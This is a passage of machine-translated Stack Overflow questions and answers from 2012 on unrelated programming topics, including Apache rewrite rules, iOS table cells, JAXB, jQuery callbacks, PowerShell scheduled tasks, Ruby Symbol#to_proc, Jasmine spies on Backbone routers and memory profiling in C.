RewriteRule ^(\w+)/?$ /?user=$1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:56:15.747

我认为您的做法是正确的，但是却以错误的方式解释了它！

问题是您不需要初始 / 因为传递给测试的 URL 不包含它！？

我怀疑它应该是 RewriteRule ^(\w+)/?$ /?u=$1

另外，请注意不要以循环结束！

# ios - UITableView 只更新最后一个单元格。它显示其他 15 个的所有信息，但仅更新 NSTimer 调用的第 16 个单元格

> ID：11847309
> 
> 赞同：0
> 
> 时间：2012-08-07T13:41:28.270
> 
> 标签：ios, uitableview, location-based

我正在构建一个应用程序，它显示从用户位置到建筑物的距离和方向。一切正常，并且为最后一个单元格完美更新。显示距离和航向图像的变化。但是，初始 cellForRowAtIndexPath 创建后的前 15 个单元格不会更新。每 1 秒在 NSTimer 上调用一次更新，以重新加载 tableView。我尝试过使用标签并在没有标签的情况下运行它。下面是我的代码。我很感激任何帮助。

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    static int locationTags[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

    cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

        CNULocation * curLocation = [self.locationArray objectAtIndex:[indexPath row]];

        //NSLog(@"@@@@@ LOCATION IS : %@", curLocation.name);

        coord.latitude = curLocation.location.latitude;
        coord.longitude = curLocation.location.longitude;

        cell.textLabel.text = [curLocation name];
        cell.imageView.image = [curLocation icon];

        if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPhone) {
            dist = [[UILabel alloc] initWithFrame:CGRectMake(180,10,180,24)];
            imgView = [[UIImageView alloc] initWithFrame:CGRectMake(290,10,24,24)];

        } else {
            dist = [[UILabel alloc] initWithFrame:CGRectMake(440,10,180,24)];
            imgView = [[UIImageView alloc] initWithFrame:CGRectMake(640,10,24,24)];
        }
        [imgView setImage:[UIImage imageNamed:@"193-location-arrow copy.png"]];

        atloc = false;
        GeoAngle = [self setLatLonForDistanceAndAngle:userLoc];
        imgView.transform=CGAffineTransformMakeRotation((direction* M_PI / 180)+ GeoAngle);

        dist.opaque = false;
        if(boolyard && !atloc){
            dist.text = [[NSString alloc] initWithFormat:@"%.02f yards",distance];
            //NSLog(@"@@@@@@@Distance in yards@@@@@@@: %f", distance);
        }else if(!boolyard && !atloc) {
            dist.text = [[NSString alloc] initWithFormat:@"%.02f feet",distance];
            //NSLog(@"@@@@@@@Distance in feet@@@@@@@: %f", distance);
        }else if(atloc){
            dist.text = @"You are here!";
            [imgView setImage:nil];
        }

        dist.backgroundColor = [UIColor clearColor];
        dist.textAlignment   = UITextAlignmentRight;

        if (tags > 15) {
            tags = 0;
        }
        int ViewTags = locationTags[tags];
        cell.tag = ViewTags;
        tags++;
        //NSLog(@"Tags: %i",tags);
        dist.tag= ViewTags;
        imgView.tag = ViewTags;

        [cell.contentView addSubview:imgView];
        [cell.contentView addSubview:dist];

    }else {

        if (tags > 15) {
            tags = 0;
        }

        int ViewTags = locationTags[tags];
        cell.tag = ViewTags;
        tags++;
        imgView.tag = ViewTags;
        dist.tag=ViewTags;

        dist.opaque = true;
        imgView.opaque = true;

        //[imgView setImage:[UIImage imageNamed:@"193-location-arrow copy.png"]];

        GeoAngle = [self setLatLonForDistanceAndAngle:userLoc];
        imgView.transform=CGAffineTransformMakeRotation((direction* M_PI / 180)+ GeoAngle);

        if(boolyard && !atloc){
            dist.text = [[NSString alloc] initWithFormat:@"%.02f yards",distance];
            //NSLog(@"@@@@@@@Distance in yards@@@@@@@: %f", distance);
        }else if(!boolyard && !atloc) {
            dist.text = [[NSString alloc] initWithFormat:@"%.02f feet",distance];
            //NSLog(@"@@@@@@@Distance in feet@@@@@@@: %f", distance);
        }else if(atloc){
            dist.text = @"You are here!";
            [imgView setImage:nil];
        }

    }   

    //boolyard = true;
    //atloc = false;
    return cell;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T09:29:47.717

我认为“其他”不应该在这里。

```
if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

...
    } else {
...
} 
```

# php - 获取带有错误 HTTP 400 错误请求的 Apple RSS

> ID：11847317
> 
> 赞同：0
> 
> 时间：2012-08-07T13:42:10.113
> 
> 标签：php, rss, file-get-contents

我正在尝试使用 PHP 获取 Apple RSS 提要，该提要以前可以正常工作，但最近显示错误“错误 400 错误请求”

我已经在我的代码中尝试了所有可能的检查，没关系。在网上搜索没有帮助，因为没有相关信息。

`file_get_contents()`我最好的猜测是 Apple 已经在他们的网站上实施了某种安全措施，尽管我可以在 Web 浏览器中打开 XML，但它不允许使用下载 XML 。

XML 文件可以从[http://www.apple.com/rss](http://www.apple.com/rss)下载，右侧有 RSS 生成器的链接。

有人在这吗？

# java - JAXB：如何在解组过程中操作数据

> ID：11847318
> 
> 赞同：1
> 
> 时间：2012-08-07T13:42:09.327
> 
> 标签：java, jaxb2

**我正在将 jaxb 用于解组过程**

**这是我的要求**

```
<kiran acct = "1234567" />

package com;
@XmlRootElement(name = "kiran")
@XmlAccessorType(XmlAccessType.FIELD)
public class CustAcct {

    @XmlAttribute
    private String acct;

    public CustAcct() {

        super();
    }

    public String getAcct() {
        System.out.println("The New Getter Method of Account is called");
        return acct;
    }

    public void setAcct(String s) {
        System.out.println("The New Setter Method of Account  is called");
        acct = s;
    }

} 
```

**这是 Jersey（Restful Framework）自动将数据与 JAXB 绑定的方式**

```
public class HelloService {

    @POST
    @Produces("application/text")
    public String sayPlainTextHello(CustAcct custdata) {

        System.out.println("The New Account is " + custdata.getAcct());
        return "Hi";
    }

} 
```

我的问题是，**为什么在这种情况下没有调用 Setter 方法 setAcct**？

我的意思是为什么没有打印“调用帐户的新 Setter 方法”行，以及调用 getMethod 内的行的位置（调用了帐户的新 Getter 方法）

**基本上我想将数据处理为在请求 XML 中发送的属性。**

是否有任何回调方法可以控制数据的设置方式？

提前致谢 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:44:33.230

**为什么在这种情况下没有调用 Setter 方法 setAcct ？**

因为您将访问类型设置为 field: `@XmlAccessorType(XmlAccessType.FIELD)`。将其更改为`@XmlAccessorType(XmlAccessType.PROPERTY)`

[XmlAccessType](http://docs.oracle.com/javase/6/docs/api/javax/xml/bind/annotation/XmlAccessType.html) javadoc。

**是否有任何回调方法可以控制数据的设置方式？**

是的。[使用适配器](http://blog.bdoughan.com/2010/07/xmladapter-jaxbs-secret-weapon.html)时，您可以完全控制编组/解组过程。

# php - 处理 php 页面中的 javascript 列表

> ID：11847319
> 
> 赞同：0
> 
> 时间：2012-08-07T13:42:10.267
> 
> 标签：php, javascript, ajax

我正在使用 ajax php 我有一个问题，即

我在 ajax 请求中传递一个 javascript 列表

```
data: "user_names="+ user_names ; 
```

我在 php 页面上得到这个列表，比如

```
$participants_names = $_GET['user_names']; 
```

我正在尝试迭代该列表，例如

```
 for ($i = 0; $i <= $participants_names; $i++) {
      print $i;
   } 
```

但我没有得到结果，实际上我来自 python 并且第一次接触到这个，php 所以请帮助我找出我出轨的地方。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:43:57.160

`$_GET['user_names']`是一个字符串。您可以使用explode 或split php 函数使其成为一个数组。

If`user_names`是以逗号分隔的名称列表：

```
$participants_names = explode( ',', $_GET['user_names']); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:46:47.310

我认为您不能简单地将列表作为参数传递，您应该将其序列化。我建议您使用大多数浏览器都支持的 JSON。

在 JS 中将此作为参数传递

```
"user_names="+JSON.stringify(user_names); 
```

在 PHP 中使用这个

```
$participants_names = json_decode($_GET['user_names']); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:46:07.513

做一个...

```
var_dump($participants_names); 
```

......以及它所拥有的东西。我猜它类似于逗号分隔的列表？

```
$list = explode(',', $participants_names); // Create an array named $list
for($i = 0; $i <= count($list); $i++) {
    echo $i;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:46:43.913

```
var usernames = ["A", "B", "C"]
data: "user_names="+ user_names.join(",") ; 
$participants_names = explode(",", $_GET['user_names']); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T13:48:11.677

尝试（假设您的用户名用分号分隔）

```
$arrayUsers = explode(";", $_GET['user_names']);  
foreach($arrayUsers as $user){
   echo $user;
} 
```

# html - Paper.js VS EaselJS VS Fabric.js VS KineticJS

> ID：11847320
> 
> 赞同：6
> 
> 时间：2012-08-07T13:42:13.780
> 
> 标签：html, canvas, frameworks

*   [paper.js](https://github.com/paperjs/paper.js)
*   [画架](https://github.com/CreateJS/EaselJS)
*   [织物.js](https://github.com/fabricjs/fabric.js)
*   [KineticJS](https://github.com/ericdrowell/KineticJS)

大家好，我是 html5 画布开发的新手，我在选择画布框架时迷失了方向。它们太多了，我不知道该用什么。所以我在这里！我希望您的帮助来选择哪一个更适合我的需要。有我的需求

1）我想要使用矢量图形的框架，我知道canvas不是DOM，我真的不在乎它但我的意思是我想在创建对象后对其进行操作，PaperJS有这个我不知道的功能其他。如果可以使用高级鼠标事件，那就更好了。

2）我想使用图像框架，我将加载图像并用画布动画它们，移动，动画一些颜色......

3）由于我的需要，我希望框架快速（图像动画应该是流畅的）

4) 我希望框架拥有良好的社区，因为我知道我需要一些帮助。

那么你觉得哪一个更适合我呢？如果你能从我的列表中写下每个框架的优势和劣势，请告诉我？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:59:00.290

HTML5 canvas 环境还是很新鲜的。您可以得到印象，有很多工具已经可用，但它们通常很不成熟。

我的回答将只涵盖您的部分问题，因为我只使用了 KineticJS 和 EaselJS。您可以从阅读[此页面上](http://www.mobilegameengines.com/html5/engines/69-easeljs/)的意见开始（我的是底部的最后一个）。

简短地说 KineticJS 的进入门槛较低。它是一个简单的绘图库，并且对鼠标事件也有一些支持。在我尝试使用它的时候，它几乎无法扩展。我发现很难根据自己的需要进行定制。EaselJS 开始有点困难，但它也更高级。现在它是其他库集的一部分，统称为 CreateJS。那里似乎有很多发展。

1.  Kinetic 和 Easel 都支持鼠标事件。我记不太清了 Kinetic，感应“onMouseOver”在 Easel 上的成本很高。还提到的两个库都允许对象操作。您可以在此处找到 TweenJS 也可用作添加。
2.  Kinetic 和 Easel 再次允许这样做。Easel 还支持精灵 - 为网络游戏开发人员所熟知的“动画图像”。
3.  我不确定 Kinetic，因为在我放弃它之前我还没有达到我项目的动画部分（库，而不是项目）。使用 Easel 速度很棘手。它实现了一些优化方法，例如对象缓存或 snapToPixel 标志。示例似乎运行得很好。然而，尽管在优化方面付出了很多努力，但对于我使用 Easel 的项目来说，平滑度仍然是一个问题。也许我滥用了 API，或者我还没有注意到还有更多优化的地方。
4.  这两个库都很年轻，但似乎正在积极开发。作者反应灵敏。社区仍然不大，但我猜 CreateJS 作为更完整的游戏创建工具集会发展得更快。

如果要检查这里是[我提到的项目](http://touk.pl)。这是一个使用 EaselJS + TweenJS 制作的网页。不过仍然需要一些小的调整。

# javascript - arguments_ 指的是什么？

> ID：11847324
> 
> 赞同：0
> 
> 时间：2012-08-07T13:42:20.223
> 
> 标签：javascript

我正在尝试实现一些插件并找到对但是的引用，`arguments_`但它正在`undefined`控制台中出现。我在网上找不到对此变量的任何引用，但它似乎是在其他 JS 代码中找到的东西。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-23T09:56:16.160

看起来 js2coffee 转换`arguments`为`arguments_`- 这是一个错误。应该是`arguments`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T13:48:02.733

每个函数在其范围内都有一个可用的数组[`arguments`对象。](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/arguments)它包含诸如调用函数的内容、传递的参数等信息。

您所看到的`arguments_`很可能是第三方库，它存储了`arguments`来自特定函数的一些变量，以供其他函数稍后使用。但是，如果不知道您包含哪些库，则无法分辨。

# android - 当我在 listView 中使用编辑文本时，无法单击多列自定义 listView 项目？

> ID：11847327
> 
> 赞同：2
> 
> 时间：2012-08-07T13:42:43.807
> 
> 标签：android

我有三列自定义列表视图，如数量、项目、价格。如果在自定义列表中使用 textView 显示三列，它的可点击工作正常。但是如果我使用两个 textView 和一个 editText，那么我无法单击该项目。我只能编辑editText 字段。但不能点击。

```
 public class TicketActivity extends Activity{
TextView t1;
TextView t2;
ListView l1;
TextView t6;
    public void onCreate(Bundle savedInstanceState){
super.onCreate(savedInstanceState);
setContentView(R.layout.ticket);
t1=(TextView)findViewById(R.id.textView3);
t2=(TextView)findViewById(R.id.textView5);
l1=(ListView)findViewById(R.id.listView1);

   //Get the Table no Value From Edit Text

Intent i1=getIntent();
Bundle b=i1.getExtras();
int num=b.getInt("Table No:");
    String pno=Integer.toString(num);
    t1.setText(pno);

        //Get The Guest Value From Edit Text

    Intent i2=getIntent();
    Bundle b1=i2.getExtras();
    int num1=b1.getInt("Guest:");
    String pno1=Integer.toString(num1);
    t2.setText(pno1);

     // List<String> st=GlobalClass.myval;

       //ArrayAdapter<String> ada = new ArrayAdapter<String>( this, android.R.layout.simple_list_item_1,st);

       l1.setAdapter(new EfficientAdapter(TicketActivity.this));
     l1.setOnItemClickListener(new OnItemClickListener(){
   public void onItemClick(AdapterView<?> parent,View view,int position,long id){

       String[] s1 = (String[]) parent.getItemAtPosition(position);

       Toast.makeText(getApplicationContext(), "Selected:"+ s1,Toast.LENGTH_SHORT).show();
   }
       });
      } 
   private static class EfficientAdapter extends BaseAdapter{
    private LayoutInflater mInflater;

    public EfficientAdapter(Context context){
        mInflater=LayoutInflater.from(context);

    // implementation of EfficientAdapter   
    }
    public int getCount() {

        return GlobalClass.myval.size();//<GlobalClass.myvals.size()?GlobalClass.myval.size():GlobalClass.myvals.size();

    }
    public Object getItem(int position) {

        return position;
    }
    public long getItemId(int position) {

        return position ;
    }
    public View getView(int position, View convertView, ViewGroup parent) {
        ViewHolder holder;
        String[] stockArr = new String[GlobalClass.myval.size()];
        stockArr = GlobalClass.myval.toArray(stockArr);
        String[] stockArr1=new String[GlobalClass.myvals.size()];
        stockArr1=GlobalClass.myvals.toArray(stockArr1);
    if(convertView==null){
            convertView=mInflater.inflate(R.layout.list_ticket, null);
            holder=new ViewHolder();
            holder.Text1=(EditText) convertView.findViewById(R.id.editText1);
            holder.Text2=(TextView) convertView.findViewById(R.id.textView2);
            holder.Text3=(TextView) convertView.findViewById(R.id.textView3);
            convertView.setTag(holder);
        }
        else{
              holder=(ViewHolder)convertView.getTag();
            }
           holder.Text1.setText("1");
            holder.Text2.setText(stockArr[position]);
            holder.Text3.setText(stockArr1[position]);
            return convertView;

     }

    }
    static class ViewHolder{
        EditText Text1;
        TextView Text2;
        TextView Text3;

    }

      } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:00:37.953

在你的 onCreate() 中试试这个：

```
l1.setItemsCanFocus(true); 
```

**请注意**，这必须在该行之后完成

```
l1=(ListView)findViewById(R.id.listView1); 
```

否则你会得到一个 NullPointerException。

既然您已经告诉您的 ListView “让您的项目集中”，您必须*在您的孩子*中使用

```
// In items of your ListView
setOnFocusChangeListener(new OnFocusChangeListener() {
    @Override
    public void onFocusChange(View v, boolean hasFocus) {
        // TODO: handle focus here

    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:49:03.630

你可以尝试弄乱

```
setItemsCanFocus(true) 
```

这将让您控制您的适配器或子视图是否获得点击事件。 [这是文档](http://developer.android.com/reference/android/widget/ListView.html#setItemsCanFocus%28boolean%29)

# jquery - JQuery $.get ：搜索数据响应以获取一些属性值

> ID：11847328
> 
> 赞同：2
> 
> 时间：2012-08-07T13:42:44.317
> 
> 标签：jquery, get, replacewith

我正在尝试使用 $.get 将 div 替换为其更新版本。我正在做这样的事情：

```
$('.clickable').click( function() { 
   $.get(url, function(data) {
      $(this).replaceWith(data);
   });
}); 
```

但这似乎不起作用。我猜这个 $(this) 不喜欢这样改变，或者它应该工作吗？如果我不想通过搜索数据来检索当前 div 的属性值，有可能吗？

编辑：删除`$.get(url + ' #' + $(this).attr('id')`，因为它似乎 $.get 实际上不像 load() 。因此，替换的 div 将显示整个数据......如果有人有适当的解决方案来选择部分数据，我将不胜感激。添加评论或其他内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:45:36.843

```
$('.clickable').click( function() { 
   $.get(url + ' #' + $(this).attr('id'), function(data) {
      $(this).replaceWith(data); // here
   });
}); 
```

在你的回调范围内，`this`指的是回调本身。使用另一个变量临时存储可点击：

```
$('.clickable').click( function() { 
   var that = this;
   $.get(url + ' #' + $(this).attr('id'), function(data) {
      $(that).replaceWith(data);
   });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:45:45.960

在你`$.get`的功能中，有一个新的范围，所以`this`不是`this`以前的。您可以将其保存在变量中：

```
$('.clickable').click( function() { 
   var elem = this;
   $.get(url + ' #' + $(this).attr('id'), function(data) {
      $(elem).replaceWith(data);
   });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:49:10.267

this 指的是 get 对象，您可以在调用 get 操作之前将其设置为标识符，即

```
$('.clickable').click( function() { 
   var replaceable = this;
   $.get(url + ' #' + $(this).attr('id'), function(data) {
      $(replaceable).replaceWith(data);
   });
}); 
```

# windows - 为什么此脚本不能通过 Powershell 脚本进行计划任务事件？

> ID：11847330
> 
> 赞同：1
> 
> 时间：2012-08-07T13:42:46.260
> 
> 标签：windows, powershell, windows-server-2003

我在处理一个脚本时遇到了一个小问题。

代码本身运行良好；当我在本地工作站上运行它时，它是完美的。但是，当我在其中一台需要安装 SCCM（此脚本旨在自动安装）的服务器（Win 2003 R2 32 位）上运行它时，它在我的一个功能中失败了。相关代码如下：

```
 # Schedules Weekly tasks
    function SchWeekly
    {param ([string]$Comp, [string]$Date, [string]$RunTime, [int]$DayOfWeek, [string]        $commandpath)

    $service = new-object -comobject "Schedule.Service"             # Forms object reference
    $service.Connect($Comp)                                         # Connects to host machine
    $rootFolder = $service.GetFolder("\")                       # Sets root folder of Task Scheduler
    $taskDefinition = $service.NewTask(0)                           # Begins task creation
    $regInfo = $taskDefinition.RegistrationInfo                     # Sets registry info
    $regInfo.Description = 'SCCM Check For Update'
    $regInfo.Author = "Administrator"
    $settings=$taskDefinition.Settings                              # Sets default settings for the new task
    $settings.StartWhenAvailable = $True
    $settings.Hidden = $False
    $triggers = $taskDefinition.Triggers                            # Creates Trigger object reference
    $trigger = $triggers.Create(3)                                  # Sets to create (Number 3 means Weekly trigger)
    # Start Time ex. 2012-6-10 22:00:00
    $trigger.StartBoundary = $Date + "T" + $RunTime                 # Sets start date (End date can be set) e
                                                            # ex. $trigger.EndBoundary = Date + "T" + Time
    $trigger.DaysOfWeek = $DayOfWeek                                # Sends integer for day of week to run on (1-7)
                                                            # 1 = Sunday, 2 = Monday, etc....
    $trigger.WeeksInterval = 1                                      # Sets to run every week
    $trigger.Id = "WeeklyTriggerId"                                 # Trigger ID name
    $trigger.Enabled = $True
    $Action = $taskDefinition.Actions.Create(0)
    $Action.Path = $commandpath                                         # Links to script
    $rootFolder.RegisterTaskDefinition('SCCM Check For Update', $taskDefinition, 6, "", "", 3)  # Registers scheduled task
    } 
```

错误具体在这一行： $service = new-object -comobject "Schedule.Service"

它报告“无法加载 COM 类型 Schedule.Service”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:27:34.753

原因是您的本地机器是 widows 7 server 2003 没有 comobject "Schedule.Service" 它是 windows 7 和 2008 的一部分。

如果您点击下面的链接，它将向您展示如何使用 powershell 在 Windows 2003 服务器上安排任务。

[在 w2k3 上安排任务](http://letitknow.wordpress.com/2011/05/20/create-scheduled-task-by-using-powershell/)

# ruby - &:aFunction 的 &: 是做什么的？

> ID：11847336
> 
> 赞同：-1
> 
> 时间：2012-08-07T13:42:58.940
> 
> 标签：ruby, symbols, proc

我正在审查某人的 ruby​​ 代码，他们在其中编写了类似于以下内容的内容：

```
class Example
  attr_reader :val
  def initialize(val)
    @val = val
  end
end

def trigger
  puts self.val
end

anArray = [Example.new(10), Example.new(21)]
anArray.each(&:trigger) 
```

`:trigger`表示符号被采用并将其转换`&`为`proc`?

如果这是正确的，除了使用之外，还有什么方法可以将变量传递给触发器`self.`吗？

这是相关的，但从未回答： [http ://www.ruby-forum.com/topic/198284#863450](http://www.ruby-forum.com/topic/198284#863450)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:46:16.663

`Symbol#to_proc`是调用无参数方法的快捷方式。如果需要传递参数，请使用完整形式。

```
[100, 200, 300].map(&:to_s) # => ["100", "200", "300"]
[100, 200, 300].map {|i| i.to_s(16) } # => ["64", "c8", "12c"] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:46:23.690

> 有没有办法将变量传递给触发器

不。

您正在调用`Symbol#to_proc`which 不允许您指定任何参数。这是 Ruby 专门为调用不带参数的方法而提供的一种方便的糖。

如果需要参数，则必须使用完整的块语法：

```
anArray.each do |i|
  i.trigger(arguments...)
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-03T09:15:49.130

这将完全满足您的需要：

```
def trigger(ex)
  puts ex.val
end

anArray = [Example.new(10), Example.new(21)]
anArray.each(&method(:trigger))
# 10
# 21 
```

# javascript - 使用 Jasmine 监视 Backbone.js 路由调用

> ID：11847339
> 
> 赞同：9
> 
> 时间：2012-08-07T13:43:04.067
> 
> 标签：javascript, backbone.js, coffeescript, jasmine

在监视骨干路由器上的方法调用时遇到问题，以确保它在给定路由上调用正确的方法。

测试摘录

```
describe 'Router', ->
    beforeEach ->
        @router = new App.Router()
        Backbone.history.start()

    afterEach ->
        Backbone.history.stop()

    describe 'routes', ->
         it 'should be defined', ->
              expect(@router.routes).toBeDefined()

         describe 'default route', ->
             it 'should be defined', ->
                  expect(@router.routes['']).toBeDefined()

             it 'should call index', ->
                 spy = spyOn(@router, "index")
                 @router.navigate('', true)
                 expect(spy).toHaveBeenCalled() 
```

路由器

```
class App.Router extends Backbone.Router
    routes:
        '' : 'index'

    index: ->
        console.log "router.index has been called" 
```

除了最后一个测试“应该调用索引”之外，一切都通过了。它失败并显示消息“预期的间谍索引已被调用”。我试过其他变种

```
it "should call index", ->
    spyOn(@router, "index")
    @router.navigate('', true)
    expect(@router.index).toHaveBeenCalled() 
```

我还可以在原始 Router.index 函数的测试输出中看到“router.index 已被调用”日志输出

谢谢！

编辑：一种解决方案

```
describe '#1 Solution', ->
    it 'should call index', ->
        spyOn(App.Router.prototype, "index")
        @router = new App.Router()
        Backbone.history.start()
        @router.navigate('', true)
        expect(App.Router.prototype.index).toHaveBeenCalled() 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-07T15:38:15.827

我花了太多时间来提供一个[有效的 jsFiddle](http://jsfiddle.net/fguillen/4Ndgc/)，@MarkRushakoff 已经回答了这个问题。

我还是有一些意见。

Backbone 绑定路由的方式使得测试它变得非常困难。

关键是路由器*方法*不是直接在路由器*实例*中调用的，方法是作为*回调*存储在内部`Backbone.history.route`等待执行[的，检查Backbone.Router.route代码](https://github.com/documentcloud/backbone/blob/master/backbone.js#L911-922)。

此操作是在`Router`实例化的那一刻完成的，因此您必须在实例化引用之前使用*Router.method*`spy` ，因此您还必须在激活后延迟。*`Backbone.history.start``spy`*

 *由于您必须在`spy`创建路由器实例之前声明，您必须在*Class*级别进行。

这么说这是我带来的最简单的解决方案：

```
describe("Router", function() {
  afterEach( function(){
    Backbone.history.stop();
  });

  it("should call index", function(){
    spyOn(App.Router.prototype, "index")
    var router = new App.Router(); // instance created after spy activation
    Backbone.history.start();      // it has to start after the Router instance is created

    router.navigate('', true);

    expect(App.Router.prototype.index).toHaveBeenCalled();  
  });
}); 
```

结论，我认为`Backbone.Router`实现没有直观的设计。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T14:09:07.413

我很确定这与 Backbone 在使用路由哈希时绑定到其路由方法的方式有关（尤其是在您看到控制台日志正确输出的情况下）。也就是说，路由器已绑定到原始`index`方法，但您的间谍已替换“当前”`index`方法。

你有两个选择：

*   `spyOn(@router, "index")`在路由器绑定到路由之前（可能很难）
*   窥探原型的`index`方法：`spyOn(App.router.prototype, "index"); @router.navigate('', true); expect(App.router.prototype.index).toHaveBeenCalled();`*

# python - 虽然不在列表中

> ID：11847341
> 
> 赞同：3
> 
> 时间：2012-08-07T13:43:09.717
> 
> 标签：python, python-3.x, while-loop

我正在尝试编写代码，我想问你如何让 while 循环重复直到找到一个单词，例如在我的情况下是列表中的**END**。

```
L=[]
while "END" (not) in L :
   L=L.append(something) 
```

问我你是否不明白我的意思。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T13:48:09.670

您编写的代码可以正常工作，除了`list.append()`返回 None 并就地修改列表；不要将其分配回 L：

```
L=[]
while "END" not in L :
   L.append(something) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-07T13:46:16.407

```
>>> a = [1,2,3]
>>> while 12 not in a:
...  a.append(len(a)+1)
...
>>> a
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] 
```

例如 ...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:48:42.783

如果你有一些东西的清单，这就是你如何达到预期的结果。

```
for something in somethings:
    if something != "END":
        L.append(something) 
```

# python - 无法自定义管理模板

> ID：11847342
> 
> 赞同：2
> 
> 时间：2012-08-07T13:43:12.170
> 
> 标签：python, django

我想自定义管理模板。这就是我所做的：

1.  为新模板创建了一个文件夹`C:/xampp/htdocs/myblog/templates/admin`
2.  从复制标准模板`C:\Python27\Lib\site packages\django\contrib\admin\templates\admin\base_site.html`
3.  编辑了复制的模板
4.  将 django 配置为使用新模板（添加到新目录到`TEMPLATE_DIRS`in `settings.py`）

    ```
    TEMPLATE_DIRS = (
       'C:/xampp/htdocs/myblog/templates'
    ) 
    ```

[*根据Django 文档*](https://docs.djangoproject.com/en/1.4/intro/tutorial02/)，这就是所有要做的事情[](https://docs.djangoproject.com/en/1.4/intro/tutorial02/)

 *我也尝试重新启动服务器，但没有成功。*

# cordova - 您可以将 Selenium 与 phonegap 应用程序一起使用吗？

> ID：11847344
> 
> 赞同：1
> 
> 时间：2012-08-07T13:43:15.550
> 
> 标签：cordova, selenium

我们需要知道是否可以将 selenium 与 phonegap 应用程序一起使用。我们正在尝试 sikuli 进行自动化，但如果可能的话，我们更喜欢 selenium

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T22:58:43.217

这是一个*取决于*倾向于否的答案。

如果您从 SD 卡加载 HTML，则不会。据我所知，应用程序无法从另一个应用程序访问资产，因为这会造成 IP/版权噩梦。

如果您的应用程序托管在某个站点上，然后加载了该应用程序，则可以测试其中的一些应用程序。与 Cordova 交互的部分将无法测试。

# c - 分析 C 应用程序中的最大内存使用情况 - linux

> ID：11847348
> 
> 赞同：4
> 
> 时间：2012-08-07T13:43:29.707
> 
> 标签：c, linux, memory, profiling, memory-profiling

我正在为 linux 下的 php 开发 C 模块，我正在尝试找到一种方法来帮助我通过最大内存峰值（使用）来分析我的代码。

使用 valgrind 我可以在代码中获得总内存分配。但由于它与分配的内存一样，它来来去去;）。我需要得到的是在 C 应用程序运行期间出现的最高内存使用率，这样我就可以全面了解内存需求并为代码优化提供一些测量点。

有谁知道任何可以提供帮助的工具/技巧/良好做法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T13:48:35.877

看看 Massif：http: [//valgrind.org/docs/manual/ms-manual.html](http://valgrind.org/docs/manual/ms-manual.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:50:09.170

你检查过地块（Valgrind 的工具之一）吗？这实际上是您正在寻找的

另一种可能性是 memusage（glibc 的实用程序之一，glibc-utils）

# cuda - 使用 CUDA 查询可用的 CPU 处理器数量

> ID：11847351
> 
> 赞同：0
> 
> 时间：2012-08-07T13:43:44.867
> 
> 标签：cuda

是否可以使用 CUDA 运行时 API 找到系统中可用的处理器数量？我知道使用`cudaDeviceProp`结构我可以收集有关特定 GPU 的信息，但如何收集有关 CPU 内核的此类信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:53:52.733

CUDA 不在 CPU 内核上运行（您是否在考虑 OpenCL），因此它不提供有关 CPU 的任何信息。

检测什么类型的 cpu 和多少个内核将是特定于操作系统的 - 你在什么平台上？请参阅[使用 C 获取 Linux 中的 CPU 数量](https://stackoverflow.com/questions/4586405/get-number-of-cpus-in-linux-using-c)

# svn - 版本控制服务器建议：SVN、TFS 等

> ID：11847352
> 
> 赞同：1
> 
> 时间：2012-08-07T13:43:51.967
> 
> 标签：svn, versioning

我有一个由异常不可靠的人组成的小团队，正在努力建立基础以保持任何进展。我熟悉 Team Foundation Server，我喜欢签出/签入单个文件以处理和锁定它的基本功能。但是，对于这个团队，我需要在共享托管 Linux 服务器上运行服务器应用程序。

我设法安装了 GIT，但它似乎不是我想要的。有谁知道不同的版本控制系统可以在不维护多个存储库的情况下执行这些基本文件锁定功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:53:35.403

